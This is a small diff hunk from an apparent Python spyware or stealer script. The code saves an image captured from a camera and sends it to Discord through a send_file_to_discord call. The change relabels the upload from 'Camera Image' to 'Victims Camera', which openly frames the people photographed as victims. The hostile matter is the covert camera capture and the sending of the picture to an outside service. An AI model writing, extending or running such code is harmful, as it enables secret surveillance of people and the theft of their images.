@@ -419,7 +419,7 @@ def main():
     if image is not None:
         image_path = 'captured_image.jpg'
         cv2.imwrite(image_path, image)
-        send_file_to_discord(image_path, message="Camera Image")
+        send_file_to_discord(image_path, message="Victims Camera")
         created_files.append(image_path)
 
     
